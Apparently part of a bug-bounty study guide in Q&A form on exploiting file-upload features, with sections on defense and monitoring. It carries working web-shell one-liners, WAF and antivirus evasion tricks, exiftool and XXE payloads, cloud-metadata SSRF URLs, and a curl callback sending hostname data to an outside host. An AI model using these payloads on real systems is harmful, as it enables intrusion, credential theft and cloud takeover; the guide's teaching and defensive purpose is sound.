### Q65. How do uploads to S3 / GCS / Azure get exploited?
- **Presigned URL abuse**: app gives you a presigned PUT URL. Check if you control the **key/path** (overwrite other objects, write to a sensitive prefix), the **Content-Type**, or can set a **public ACL** (`x-amz-acl: public-read`).
- **Bucket misconfig**: world-writable bucket → upload web content; if the bucket backs a website or is proxied on the app origin → stored XSS/defacement.
- **Content-Type stored on object**: set `text/html` on an uploaded object served from a same-origin path → XSS.
- **Path/key traversal** in the key parameter → write outside your prefix.
- **SSRF to metadata** (Q67) if the upload pipeline fetches URLs server-side.

### Q66. "Upload from URL" features — why are they SSRF goldmines?

> *Plain version:* "paste a link and we'll grab the image" means **the server** makes the request, not you — so you point it at places only the server can reach: the cloud's internal metadata address (`169.254.169.254`) that hands out temporary access keys, or internal-only services. Grab the keys and you can own the whole cloud account. This is often the fastest Critical on the entire upload surface.

If the app fetches a file from a user-supplied URL ("import from link", avatar-by-URL, webhook media), it's server-side request forgery: point it at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS), `http://metadata.google.internal/...` (GCP, needs `Metadata-Flavor` header — try gopher/redirect), internal services, `file://`, `gopher://`. The "file" you get back may leak cloud keys → full account compromise. Top-tier chain.

### Q67. Walk a real expert chain: avatar upload → cloud takeover.
1. Avatar upload offers "import from URL." → SSRF.
2. Hit AWS metadata → leak temp IAM creds.
3. Use creds → list S3, find the very bucket serving the app's static site (often public-read-from-app-origin).
4. Overwrite a JS asset → stored XSS on every user → mass ATO. (Each link in this chain is a separate, well-documented bug class; chained = Critical.)

### Q68. How do I bypass a WAF/CDN on uploads (Cloudflare/Akamai/Imperva/ModSecurity)?
- **Multipart parser confusion** (Q27): duplicate `filename`, `filename*=`, newline-in-filename, missing/duplicate Content-Type, weird boundaries — WAF and app parse differently.
- **Content-Type / charset**: `Content-Type: image/png; charset=...`, casing, `application/octet-stream`.
- **Chunked / size**: very large bodies that WAF won't fully inspect; `Transfer-Encoding: chunked`.
- **Encoding the payload**: gzip the body where supported; base64 in a field the app decodes; split `<?php` across boundaries the WAF reassembles differently.
- **Obfuscate the shell**: avoid signatured strings — use `<?=` instead of `<?php`, variable functions (`$f='sys'.'tem';$f($_GET[c]);`), `assert`, `preg_replace /e`, hex/`\x` escapes, base64+`eval`, callback gadgets. (Goal: defeat AV/WAF signatures while staying valid.)
- **Different exec extension** the WAF rule set forgot (`.phar`, `.pht`, `.phtml`).

### Q69. How do I bypass server-side **antivirus** scanning of uploads?
AV (ClamAV etc.) flags known shells. Bypass: obfuscate the web shell (encoders, splitting, polymorphism), use a **non-signatured one-liner**, embed in an image/polyglot, or exploit the **race window** before the scan completes (Q61). Test with EICAR first to confirm AV exists and where it triggers. Minimal proof shells (`<?=md5(1)?>`) rarely match AV signatures.

### Q70. What is a "second-order" upload bug?
The file is benign at upload but exploited later: e.g., uploaded CSV imported into a DB later (SQLi/CSV-injection), a config file `require()`d on next deploy, a `.htaccess` that takes effect for *other* files, an XML parsed by a *different* downstream service, or a filename that's safe until it's used in a shell job at night. Think about every downstream consumer of the file.

### Q71. Content-type-driven cache poisoning / desync via uploads?
If uploaded files are cached on a shared CDN and you can influence the cache key/headers or the stored content-type, you may poison the cache (serve your XSS to others) or combine with request smuggling. Niche but high impact where present.

### Q72. Deserialization via upload — the high-skill class?
When the upload's bytes are fed to an unsafe deserializer:
- **PHP**: `unserialize()` on file content, or `phar://` metadata (Q51) → POP chain RCE.
- **Java**: `ObjectInputStream.readObject` on uploaded blob → ysoserial gadget → RCE.
- **Python**: `pickle.load` / `yaml.load` → RCE.
- **.NET**: BinaryFormatter / ViewState / Json.NET `TypeNameHandling` on uploaded data → ysoserial.net.
Recognize the sink (import/restore/"open project"/session/state features) and bring the matching gadget chain.

### Q73. How do I detect *blind* upload RCE (no output, no reachable URL)?

> *Plain version:* sometimes your code runs but you never see its output (the file's behind a processor, or you can't find its URL). So make the code **phone home** — have it do a DNS/HTTP request to a listener you control. If your listener gets a ping, the code ran, even though the page showed you nothing. Same trick proves blind XXE and SSRF.

Out-of-band. Make the payload call your collaborator (Burp Collaborator / interactsh / `oast`):
- PHP shell: `<?php system('curl https://ID.oast.fun/$(hostname|base64)'); ?>`
- ImageMagick/ffmpeg/XXE/PDF SSRF: trigger DNS/HTTP to your OAST host.
- If you get a DNS/HTTP hit on processing/access → confirmed even with no visible response.

### Q74. What header/serving conditions decide XSS vs. download?
- `Content-Disposition: attachment` → browser downloads (no XSS).
- `Content-Disposition: inline` (or none) + HTML/SVG content-type on **app origin** → XSS.
- `X-Content-Type-Options: nosniff` blocks MIME-sniffing XSS.
- Served from a **separate sandbox domain** → XSS contained off the main origin.
Always inspect the response headers when the file is fetched — that determines exploitability.

### Q75. GraphQL / API uploads — anything different?
GraphQL `multipart` spec (`operations`, `map`, file parts) — same validation issues, sometimes weaker because devs assume the schema protects them. API uploads (`PUT /files/{name}`) frequently let you control the full path/name (traversal) and content-type. Presigned-URL APIs (Q65) are common here.

### Q76. Mobile app backends?
Decompiled APKs reveal upload endpoints, S3 buckets, and content-types not exposed in the web app. KYC/document upload in fintech/banking apps (e.g., ID photos) often hit image processors (ImageMagick/Ondato-style KYC SDKs) and admin review panels — prime for SVG/XXE/processor bugs and admin-panel stored XSS.

### Q77. How do I escalate a "weak" upload finding into something that pays?
- Self-XSS via upload → make it fire in an **admin/reviewer** context (privileged ATO).
- File overwrite → overwrite a served JS/HTML or config → stored XSS / RCE.
- SSRF on import → cloud metadata → key leak.
- Path traversal write → drop a shell in webroot.
- XXE → file read of `/etc/passwd` → secrets → lateral movement.
Always push for the *highest demonstrable impact within scope* and document the chain.

### Q78. What separates an expert here from a beginner?
The expert (1) maps the **entire pipeline** and finds the seam between validator and consumer; (2) thinks in **content/processing/serving**, not just "can I upload .php"; (3) uses **OOB** to prove blind bugs; (4) **chains** upload with SSRF/IDOR/LFI/deserialization; (5) understands per-stack execution semantics; and (6) writes a crisp, reproducible PoC with safe proof and clear impact.

---

# TOOLING

### Q79. Core toolkit for upload testing?
- **Burp Suite** (Repeater, Intruder, Turbo Intruder for races) + extensions: **Upload Scanner** (NCC), **HTTP Request Smuggler** (multipart parsing), **Hackvertor** (encode/obfuscate), **Collaborator** (OOB). Caido is a solid alternative.
- **fuxploider** — automated upload bypass fuzzer (extension/MIME matrix + success oracle).
- **upload_bypass** (sAjibuu) — generates bypass filenames/content-types.
- **weevely** — stealth obfuscated PHP web shell + client.
- **exiftool** — inject payloads into image metadata.
- **ImageMagick PoCs / `convert`** — test ImageTragick/coders.
- **ysoserial / ysoserial.net** — deserialization gadgets.
- **interactsh / OAST** — blind/OOB confirmation.
- **SecLists** — `web-extensions.txt`, content-type lists, upload payloads.
- **PayloadsAllTheThings / HackTricks** — payload libraries.
- **ffuf / nuclei** — discovery + known-CVE templates.

### Q80. What goes in a good upload wordlist?
Extensions (all exec aliases per stack + double-ext + trailing tricks), Content-Type values, magic-byte prefixes, config filenames (`.htaccess`, `web.config`, `.user.ini`), traversal filenames, and obfuscated shell variants. Build a 2D Intruder attack: position 1 = extension, position 2 = content-type.

### Q81. How do I build a reliable "success oracle" for automation?
After each upload: parse the response for the stored path; **GET it**; check whether the body equals your **executed** marker (e.g., response contains `49` for `7*7`, not the literal `<?=7*7?>`). For OOB, watch your interactsh for a hit keyed to the upload ID. Without a real oracle you'll drown in false positives.

### Q82. exiftool payload examples?
```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' cat.jpg
exiftool -DocumentName='<svg onload=alert(1)>' cat.png        # XSS if EXIF reflected
exiftool -Artist='"><script>alert(document.domain)</script>' a.jpg
```

### Q83. weevely quickstart (obfuscated PHP shell)?
```bash
weevely generate <password> shell.php     # creates an obfuscated, AV-evasive shell
# upload shell.php (bypass as needed), then:
weevely http://target/uploads/shell.php <password>
```
Use only on authorized targets; for bounty, a minimal benign proof shell is usually preferable for reporting.

---

# BLACK-BOX METHODOLOGY & CHECKLIST

### Q84. Give me the step-by-step black-box methodology.
1. **Discover** every upload + every file-*consuming* feature (preview, export, import, restore, URL-fetch).
2. **Fingerprint** the stack (server header, errors, file naming, `X-Powered-By`, framework cookies) → know what executes.
3. **Baseline**: upload a legit allowed file; capture request + **retrieval URL + response headers/Content-Type**.
4. **Classify validation**: client-only? content-type? extension blacklist/whitelist? magic bytes? re-encoded? path-controlled?
5. **Attack the weakest layer** with the matching bypass (Levels 2–6).
6. **Confirm**: execution (code runs), or content (XSS/XXE/SSRF fires), or OOB hit for blind.
7. **Escalate & chain** to max impact in scope.
8. **Report** with safe PoC, exact request, retrieval proof, impact, remediation.

### Q85. What should I always check on the **serving** side?
- Exact `Content-Type` and `Content-Disposition` of the fetched file.
- Origin it's served from (app origin vs sandbox domain vs CDN).
- `X-Content-Type-Options`, CSP.
- Whether the retrieval endpoint is **IDOR-able** (other users' files).
- Whether the file is **executed, rendered, or downloaded**.

### Q86. Quick triage decision tree?
- Code executes on GET → **RCE** (Critical). Done — prove safely.
- Served as inline HTML/SVG on app origin → **stored XSS** (High).
- XML/office parsed server-side → test **XXE** (High/Critical).
- Image processed → test **ImageTragick/SSRF/DoS**.
- URL-fetch present → test **SSRF → cloud metadata** (Critical).
- Archive extracted → **Zip Slip / symlink**.
- Path/key controllable → **traversal / overwrite / IDOR**.
- Re-encoded + sandbox domain + nosniff → hardened; pivot to processing or move on.

### Q87. What evidence makes a great upload report?
The raw upload request, the **retrieval request+response showing execution/render**, a benign proof (e.g., `7*7=49`, `phpinfo`, OAST hit), the exact filename/bypass used, impact statement (what an attacker gains), affected users/scope, and concrete remediation. Screenshots/video help. Never include real exploitation beyond proof.

### Q88. Common false positives / things that look like bugs but aren't?
- File "uploads" but is stored on a non-exec sandbox domain with `attachment` disposition → likely safe.
- Code returned **as text** (not executed) → not RCE (maybe info only).
- `.svg`/`.html` blocked but served as `attachment` → not XSS.
- Self-only render with no privileged viewer → low/none.
- Re-encoded image stripping your payload → defended. Verify execution/render before claiming impact.

---

# PAYLOAD CHEAT SHEETS

### Q89. Web-shell one-liners (proof-grade) per stack.
```php
PHP:    <?php echo "RCE-".(7*7); system($_GET['c'] ?? 'id'); ?>
PHP min:<?=`$_GET[c]`?>            (backticks = shell)
PHP obf:<?php $f="sys"."tem"; $f($_GET['c']); ?>
```
```jsp
JSP:    <% out.println("RCE-"+(7*7)); Runtime.getRuntime().exec(request.getParameter("c")); %>
```
```aspx
ASPX:   <%@ Page Language="C#"%><% Response.Write(7*7);
         System.Diagnostics.Process.Start("cmd","/c "+Request["c"]); %>
```
```cfm
CFM:    <cfexecute name="cmd.exe" arguments="/c #url.c#" timeout="10"/>
```

### Q90. Bypass filename matrix (PHP target example).
```
shell.php   shell.pHp   shell.php5  shell.phtml  shell.phar  shell.pht  shell.php7
shell.php.  shell.php%20  shell.php%00.jpg  shell.php::$DATA  shell.php/  shell.php.jpg
shell.jpg.php   shell.php.....   .htaccess   .user.ini   shell.gif (with .htaccess AddType)
```

### Q91. Magic-byte prefixes (prepend to payload).
```
GIF:  GIF89a                       (47 49 46 38 39 61)
PNG:  \x89PNG\r\n\x1a\n            (89 50 4E 47 0D 0A 1A 0A)
JPEG: \xFF\xD8\xFF\xE0..JFIF       (FF D8 FF E0)
PDF:  %PDF-1.5
ZIP/Office: PK\x03\x04             (50 4B 03 04)
```
Example combined: `GIF89a;<?php system($_GET['c']);?>` saved as a `.php`-executing name.

### Q92. Config-file payloads.
```apache
# .htaccess  (run .jpg/.gif as PHP)
AddType application/x-httpd-php .jpg
# or
<FilesMatch "\.(jpe?g|png|gif)$"> SetHandler application/x-httpd-php </FilesMatch>
```
```ini
; .user.ini  (PHP-FPM)  -> auto-include your shell into every .php in this dir
auto_prepend_file=shell.gif
```
```xml
<!-- web.config (IIS) — see Q34; enables handler/classic-asp execution in dir -->
```
```xml
<!-- evil.svg — stored XSS -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```
```xml
<!-- XXE in SVG / XML upload -->
<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg><text>&x;</text></svg>
```

---

# REAL-WORLD CASE PATTERNS & REFERENCES

### Q93. What recurring patterns show up in real bug-bounty upload reports?
- **Profile-picture / avatar** endpoints accepting `.svg` → stored XSS rendered in others' browsers (countless H1 reports across SaaS).
- **"Import from URL" / remote avatar** → SSRF → cloud metadata → key leak (multiple high/critical disclosures).
- **Document/KYC parsers** (DOCX/PDF/XML) → **XXE** file read & SSRF (banking/fintech, HR/ATS resume parsers).
- **Image resizers** → **ImageTragick** RCE/SSRF (broad 2016 wave; still found on legacy stacks).
- **CMS/plugin arbitrary upload** (WordPress plugins, CKFinder/elFinder, Tomcat Manager `.war`) → direct RCE — perennial top earners.
- **Zip/restore/import** features → **Zip Slip** → RCE (Snyk's 2018 research listed many affected projects).
- **Presigned S3** flows letting users control key/ACL/content-type → object overwrite / stored XSS.

### Q94. Which learning resources should I actually work through?
- **PortSwigger Web Security Academy → File upload** (do all labs: content-type bypass, blacklist bypass via `.htaccess`, obfuscated extensions, polyglot, race condition).
- **OWASP WSTG** "Test Upload of Unexpected/Malicious File Types" + **OWASP File Upload Cheat Sheet** (the canonical defense list).
- **HackTricks → File Upload** and **PayloadsAllTheThings → Upload Insecure Files** (payload encyclopedias).
- **ImageTragick.com** (CVE-2016-3714 details).
- **Snyk Zip Slip** writeup; **Sam Thomas phar deserialization** (BlackHat 2018) slides/paper.
- Public HackerOne/Bugcrowd disclosed reports tagged "file upload / RCE / SSRF" — read 20+ to internalize patterns.

### Q95. CVEs / classics worth knowing by name?
- **CVE-2016-3714** ImageTragick (ImageMagick delegate RCE).
- **CVE-2017-12615 / CVE-2017-12617** Apache Tomcat PUT/JSP upload RCE.
- **CVE-2009-2265** ColdFusion FCKeditor unauth upload RCE.
- **Zip Slip** (2018, Snyk) — arbitrary file write via archive extraction.
- **phar://** unserialize (2018) — file-op → object injection.
- Endless **WordPress plugin "arbitrary file upload"** CVEs (check wpscan/Exploit-DB per plugin).

### Q96. How do real attackers persist after an upload RCE (red-team)?
(Defensive awareness.) Drop a stealth/obfuscated shell in a rarely-listed dir, add an `.htaccess`/`.user.ini` for re-entry, plant a cron/scheduled task, or modify a legit served file. Detection: file-integrity monitoring on webroot, alert on new executable files in upload dirs, egress monitoring (OAST/C2 callbacks), and AV/YARA on upload paths. For bounty you stop at proof — persistence is out of scope unless explicitly authorized.

---

# DEFENSE — HOW TO DO UPLOADS SECURELY

### Q97. What's the gold-standard secure upload design?
1. **Allowlist** extensions AND content-type AND **validate magic bytes** — all three, server-side.
2. **Re-encode/transcode** images (rebuild via a safe library) to strip embedded payloads/metadata; for documents, render to a safe format.
3. **Generate a random server-side filename** (UUID); never use the user's name or path. Strip/ignore path components.
4. **Store outside the webroot** (or in a bucket) and serve via a controller that sets a safe `Content-Type` + `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`.
5. **Serve user files from a separate sandbox domain** (e.g., `usercontent.example.net`) so any XSS can't touch the app origin/cookies.
6. **Disable execution** in the upload dir (`php_admin_flag engine off`, no handlers, static-only location, drop `.htaccess`/`web.config`/`.user.ini` overrides).
7. **Size/dimension/rate limits**; scan with AV; safe archive extraction (canonicalize paths, no symlinks, limit expansion).
8. **Disable XML external entities** in every parser; keep ImageMagick/GhostScript patched + restrictive `policy.xml`.

### Q98. Specific hardening per risk?
- **Execution**: store off-webroot; static handler only; no override files; randomized names.
- **XSS**: sandbox domain, `nosniff`, `attachment`, CSP, never serve `.svg`/`.html` inline on app origin.
- **XXE**: `disallow-doctype-decl`, disable external entities/DTDs in DOCX/SVG/XML parsing.
- **ImageMagick**: restrictive `policy.xml` (disable MVG/MSL/URL/ephemeral/label coders), patch, sandbox.
- **Zip Slip**: validate each entry's canonical path is within the target dir; reject symlinks; cap total size/files.
- **SSRF (URL upload)**: allowlist destinations, block link-local/metadata/private ranges, no redirects to internal, no `file://`/`gopher://`.
- **Cloud**: server controls the object key (no user path), private ACL by default, validate content-type, short presign TTL.

### Q99. What should a blue team monitor/alert on?
New executable files appearing in upload/web dirs (FIM), uploads with double/odd extensions or script content-types, AV/YARA hits on upload paths, egress to unknown hosts from the web server (OOB callbacks), spikes in upload errors (fuzzing), and access logs hitting uploaded files with query strings (`?c=`, `?cmd=`).

### Q100. One-paragraph summary you can quote in a report.
*"File-upload security is not about blocking `.php` — it's about controlling the full lifecycle. Treat filename, content-type, and bytes as hostile; validate via allowlist + magic bytes + re-encoding; store with random names outside the webroot; serve from a sandbox domain with `attachment` + `nosniff`; disable execution and config overrides in upload dirs; harden every downstream parser (XML/image/archive) against XXE, ImageTragick, and Zip Slip; and block SSRF in any URL-fetch path. A failure at any single stage — validation, storage, processing, or serving — can escalate from a benign upload to full remote code execution and cloud compromise."*

---

# LEVEL 7 — INTERVIEW QUESTIONS (articulate it out loud)

> These test whether you can *explain* upload security, not just fire payloads — the exact thing a senior interviewer or a program's triage engineer wants to hear. Say the answer out loud; the goal is a crisp, layered explanation with the right worked example at the ready.

### Q101. Explain a file-upload vulnerability to a junior in sixty seconds — what actually makes it dangerous?
*Plain:* "Uploading a file is like handing a package to a building's mailroom. Three things decide if it's dangerous — what's *inside* it (your bytes), the *label* you wrote (filename + declared type, which you can forge), and the one that actually matters: **which room it's delivered to and who opens it.** A bomb in the mailroom bin is harmless; the same package opened in the server's control room is remote code execution."
*Mechanism:* the attacker controls the bytes, the filename, and the `Content-Type`; the server controls **interpretation and location.** A bug exists wherever the server's interpretation/location lets your bytes *execute or get parsed dangerously.*
*The one line that separates a finding from noise:* "The server accepted my file" is a non-event — "**the server stored my file in `/uploads/` on the app origin and executed it as PHP when I requested the URL**" is a Critical. Always end on *where it's stored, what URL serves it, and which handler opens it.*

### Q102. A developer insists "we validate the `Content-Type` header, so uploads are safe." Rebut it precisely.
*Plain:* the `Content-Type` header is a label the *client* writes — trusting it is like checking a parcel's "FRAGILE — BOOKS" sticker to decide it isn't a weapon.
*Mechanism:* in a multipart body you set the per-part `Content-Type` to anything; it never has to match the bytes or the extension. So `filename="shell.phtml"` + `Content-Type: image/png` sails through a header check and still executes.
*Worked rebuttal:*
```http
Content-Disposition: form-data; name="avatar"; filename="shell.phtml"
Content-Type: image/png              <-- the "validation" you trust
GIF89a;
<?php echo php_uname(); ?>           <-- what actually runs
```
*Close it:* "Type must be enforced on the **bytes** (magic + real decode) *and* the **stored extension/handler**, not on an attacker-supplied header. And even perfect type validation doesn't help if the file is served executable from the web root — validation is one of four stages, and RCE only needs the *serving* stage to fail."

### Q103. Allowlist vs denylist for extensions — which do you recommend, and how do you beat each as an attacker?
*Recommendation:* **allowlist** (permit only `jpg,png,pdf`), never denylist. A denylist is a list of everything the author *remembered* to block — it leaks by omission.
*Beating a denylist:* find one executable alias they forgot — `.phtml .pht .php5 .phar` for PHP, `.cer .asa .ashx` / `web.config` for IIS, `.jspx` for Java; plus case (`.pHp`), trailing junk (`.php.`, `.php%20`, `.php::$DATA`), and double-extension (`shell.php.jpg` on Apache `AddHandler`).
*Beating an allowlist:* you can't invent an allowed name, so attack the **other stages** — a **magic-byte polyglot** that is a valid `.jpg` *and* runs (§8), a **config-file upload** (`.htaccess`/`.user.ini`) that makes an allowed `.jpg` execute (§10), the **FPM `image.jpg/x.php` path trick**, or pivot off execution entirely to **XXE/SSRF/processor** bugs on the parsed file. "Allowlist raises the bar to the serving and processing stages — it rarely closes them."

### Q104. Why is "the server accepted my `.php`" not a vulnerability? Give the one sentence that turns it into one.
*Plain:* acceptance is the *door opening*; the finding is *what you reached through it.* A `.php` sitting in blob storage that's served as `text/plain` (or never served at all) does nothing.
*Mechanism:* RCE needs **four** things true at once (§12.1): survives the controls, lands in an **executed** directory, the server has the **matching handler**, and you can **request** it. Acceptance is only the first.
*The sentence that promotes it:* "When I request `https://target/uploads/u/17/shell.phtml`, the response body contains `RCE-POC-<hash>-<hostname>` — output only server-side PHP execution can produce." Without that sentence you have an observation; with it you have a Critical.

### Q105. Explain a polyglot file to a non-security engineer.
*Plain:* it's a file that is **honestly two things at once** — a real image *and* real code — so two different programs each see what they expect.
*Mechanism:* image formats only care about their header and structured chunks; they ignore trailing/comment bytes. A script engine (PHP) scans the whole file for `<?php`. So you put a genuine `GIF89a` header up front (the image validator is satisfied) and your code in a spot the image format ignores but PHP still reads. One file passes the "is this an image?" check *and* runs when executed.
*Worked:* `printf 'GIF89a;\n<?php echo 7*7; ?>\n' > x.php` — `file x.php` says *GIF image data*, but a PHP handler prints `49`. "Same bytes, two truths — that's the whole trick."

### Q106. Walk me up the upload severity ladder out loud — what's Critical, what's noise?
Top to bottom: **RCE** (web shell / `.htaccess` / processor CVE / Zip Slip) = **Critical**, the top of the entire web-bug world. **XXE or SSRF** (arbitrary file read, cloud-metadata creds) = **High–Critical**. **Stored XSS served inline from the app origin** = **High** (Critical if it lands in an admin view or chains to ATO). **Overwrite another user's / a shared file** = **Medium–High** (Critical if it becomes RCE or ATO). Then **DoS in scope** and **CSV injection hitting staff** = **Medium**. At the bottom, **noise:** "it accepted a `.php`" with no execution, SVG-XSS trapped on a sandbox CDN with `attachment`+`nosniff`, self-only overwrite, "no file-type validation" with no demonstrated impact. "I climb to the highest rung the *context* allows and prove that rung with a benign marker — I never report a lower rung dressed up as a higher one."

### Q107. "We re-encode every uploaded image server-side." Does that kill upload RCE? Argue both sides.
*Their side:* re-encoding (resize/convert/strip) destroys appended payloads and trailing polyglot bytes — a plain `GIF89a;<?php` web shell won't survive, so naïve RCE is gone. True.
*Your side (why it can be a *bigger* bug):* the re-encoder **is a server-side program parsing attacker input** — that *is* the attack surface. ImageMagick (ImageTragick CVE-2016-3714 delegate RCE; CVE-2022-44268 arbitrary file read), Ghostscript via the PDF delegate (CVE-2023-36664 `%pipe%`), exiftool (CVE-2021-22204), FFmpeg (HLS SSRF/file-read) all execute *because* processing happens. "So 'we re-encode everything' doesn't make me give up on RCE — it tells me exactly which library to fingerprint and which CVE to fire. The payload becomes a genuinely valid file of an allowed type that detonates *inside* the parser — which is why these Criticals sit un-found on 'hardened' allowlist+sandbox uploads."

### Q108. Compare SVG stored-XSS on the app origin vs on a sandbox CDN — why does one pay and the other doesn't?
*Same file, different serving context = different severity.* An SVG can carry `<script>alert(document.domain)</script>`. If it's served **`Content-Type: image/svg+xml`, inline, from `app.target.com`** (the origin that holds the session cookie and the DOM), the script runs *in that origin* → real stored XSS → steal session/CSRF token → ATO. If the *identical* file is served from `usercontent-cdn.net` with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, it downloads instead of rendering, and even if rendered it's in a throwaway origin with nothing to steal → near-zero. "The payload is identical; the *origin and headers of the serving URL* are the entire finding — which is why I inspect the fetched response headers before I ever claim XSS."

### Q109. Why is an "import from URL" box often the fastest Critical in the whole upload feature?
*Plain:* "upload from URL / fetch logo by link / import remote document" makes the **server** go fetch a URL *you* supply — that's SSRF by construction, and you haven't touched a single extension check.
*Mechanism:* point it at the cloud metadata endpoint and the server (which *is* inside the cloud) reads it for you:
```
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```
That returns **temporary IAM credentials** → list S3, read secrets, often pivot to full account/infra takeover. "It skips the entire type-validation game and lands on cloud creds — so I test the URL-fetch feature *before* I fiddle with a single polyglot."

### Q110. What's the single most effective remediation — and why isn't "block `.php`" it?
*Not "block .php":* that's a denylist (leaks via `.phtml` etc.) and only addresses the *execution* stage while ignoring parsing (XXE), serving (SVG-XSS), and URL-fetch (SSRF).
*The highest-leverage fix:* **serve uploads from a separate, non-executing sandbox origin, with random filenames, `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`, and no server-side script handler.** That single architectural choice removes RCE (nothing executes there) *and* SVG/HTML stored-XSS (wrong origin + attachment + nosniff) at once. Layer on: allowlist + magic-byte + real re-encode; disable parser external entities and dangerous delegates; block config files; validate archive paths; SSRF-guard URL-fetch. "One design decision — *where and how it's served* — caps most of the severity; validation is defense-in-depth on top."

### Q111. "Prove RCE without dropping a web shell" — how, and why would you *want* to?
*How:* upload a file that prints a **unique marker plus a server-only fact**: `<?php echo "RCE-POC-".md5("myhandle")."-".php_uname(); ?>`. Request it; seeing `RCE-POC-<hash>-Linux host…` in the response proves the server executed your code and leaked its own hostname — a *complete* Critical. For blind cases (no visible output), make it phone home: a single benign DNS/HTTP hit to your Collaborator confirms execution out-of-band.
*Why you want to:* a marker pays exactly the same as an interactive shell, but it keeps you inside authorization (no lateral movement, no real command execution, no persistence), it's trivially safe to include in the report, and triagers *prefer* it — they don't want a weaponized backdoor on their box. "Restraint here is what keeps the engagement legal and the bounty paid."

### Q112. Rapid-fire curveballs — answer each in a sentence.
- **"Does storing uploads on S3 make us safe?"** No — S3 stops *server* RCE only if the object isn't served executable; you can still get **stored XSS** (public object served inline with an HTML/SVG content-type from an app-trusted origin), **key/path overwrite** of a served asset (supply-chain XSS), and **presigned-PUT** abuse.
- **"Does a WAF fix upload bugs?"** No — it filters some shell signatures, but multipart **parser-confusion** (duplicate `filename`, `filename*=`, weird boundaries), obfuscated shells (`<?=`, variable functions), and *processor/XXE/SSRF* paths sail past; a WAF is a speed bump, not the fix.
- **"Does HTTPS matter here?"** Irrelevant — transport encryption says nothing about whether the stored file executes or is parsed dangerously.
- **"We added `nosniff`, are SVGs safe now?"** Only partly — `nosniff` stops *MIME-sniffing* XSS, but an SVG **explicitly served `Content-Type: image/svg+xml` inline from the app origin still executes its `<script>`**; you also need `attachment`/a sandbox origin.
- **"It's an internal admin tool, so upload RCE is low-risk?"** Often the *opposite* — admin theme/plugin/backup-restore uploads are direct RCE, and an admin-rendered SVG-XSS is Critical (privileged ATO).

---

# LEVEL 8 — SCENARIO-BASED (you're handed a situation → what do you do)

> Each is a realistic snapshot. The skill being tested is *routing*: reading the baseline facts and picking the one path that leads to impact instead of fuzzing blindly. Every answer follows the guide's five-stage arc (baseline → classify → bypass → prove → stop).

### Q113. Baseline shows: avatar returns `https://cdn.usercontent-x.net/9a..f.png`, `Content-Disposition: attachment`, `nosniff`, image re-encoded to a random name; the denylist blocks `.php`. Where do you spend your time?
*Read the facts:* re-encoded + random name + **sandbox CDN** + attachment + nosniff = the RCE and app-origin-XSS doors are **shut** (§4.3, §23). Do **not** grind extension bypasses against this — it's hardened exactly where it matters.
*Where the bug still lives:* the file is being **re-encoded**, i.e. *parsed server-side* — that's a live attack surface. So: **(1)** fingerprint the processor (ImageMagick? exiftool? via error strings/timing) → fire **CVE-2022-44268 file-read / ImageTragick RCE / exiftool CVE-2021-22204** with a benign OOB (§16). **(2)** Look for *other* upload surfaces on the same app — a KYC/document import, an "import from URL" (SSRF, §15), an Office/SVG import (XXE, §14) — those rarely share the avatar's hardening. **(3)** Check whether the CDN key/Content-Type is attacker-influenced (presigned PUT, §18.1). "The hardened avatar told me where *not* to dig; the processor and the sibling features are where the Critical is."

### Q114. A KYC/passport upload shows a **thumbnail preview** a few seconds later. First test, and why?
*The tell:* a preview/thumbnail means the server **parsed and rendered your file** — it opened it. That single fact routes you straight to the parser bugs before any extension play.
*First test — XXE, because it's the highest-value and the file is likely XML under the hood* (SVG, or DOCX/XLSX = zipped XML):
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY % p SYSTEM "http://YOUR.oast.fun/x.dtd"> %p; ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>
```
Host a DTD that exfils a file to your Collaborator; an OOB hit = **blind XXE → file read/SSRF** (High–Critical). *In parallel:* if the preview is a raster thumbnail, it's an **image processor** → ImageMagick/Ghostscript/exiftool CVE (§16). "Preview = parsed = test XXE and the processor first; the extension checks are a distraction on a KYC upload."

### Q115. Your `.phtml` uploads fine and you can fetch it back, but the browser shows the **PHP source as text** — no execution. Debug it.
*What the symptom means:* three of the four RCE preconditions hold (survived controls, reachable URL) but the **handler isn't mapped** for `.phtml` at that path, or it's not an executing directory. Not RCE — yet. Work the checklist:
1. **Wrong extension for this server?** Confirm the stack (Apache mod_php vs nginx+FPM vs IIS). Try the other executable aliases: `.php5 .php7 .pht .phar` (PHP); if IIS, you're on the wrong language entirely.
2. **nginx+FPM?** Then `.phtml` may not be routed to FPM at all — try the **path trick**: request `/uploads/u/17/me.jpg/x.php` against an uploaded `GIF89a` image (`cgi.fix_pathinfo=1`), §10.4.
3. **Non-executing dir?** The `/uploads/` location may be static-only. Upload a **`.htaccess`** (`AddType application/x-httpd-php .jpg`) or **`.user.ini`** (`auto_prepend_file=`) to *make* it execute (§10) — if config files aren't blocked, that turns the text file into RCE.
4. **Double-extension on Apache `AddHandler`:** try `me.phtml.jpg` / `me.php.xxx` — Apache runs any file *containing* `.php`.
"'Served as text' is a routing gap, not a dead end — I switch the extension to one the handler owns, or I upload the config that creates a handler."

### Q116. A presigned S3 `PUT` hands you a URL and lets you choose the object **key**. Walk the attack to Critical, safely.
*Why it's dangerous:* controlling the key = controlling *where in the bucket* your bytes land. If that bucket backs the app's served assets, key control = overwrite-anything.
*The walk:* **(1)** Intercept the presign request/response; note the key is client-supplied. **(2)** Set the key to a **served asset path** — e.g. `key=static/js/app.<hash>.js` or traverse `key=../../assets/main.js` — and PUT benign, clearly-marked content (`/* x8bit-poc */console.log('poc')`), with `Content-Type: application/javascript`. **(3)** Fetch the app; if your marked JS is now served to users, that's **stored-XSS-to-all / supply-chain compromise = Critical.** **(4)** Also test `Content-Type: text/html`/`image/svg+xml` on the object and whether it's served **inline from the app origin** → stored XSS; and `x-amz-acl: public-read` for ACL abuse.
*Safety:* use a *unique, benign, obviously-PoC* payload (a comment + console.log), **don't clobber the real production asset** (write to a new adjacent key if possible, or restore immediately and note it), never serve real script to real users. "Prove I *can* overwrite a served asset with a harmless marker, then stop — the capability is the Critical."

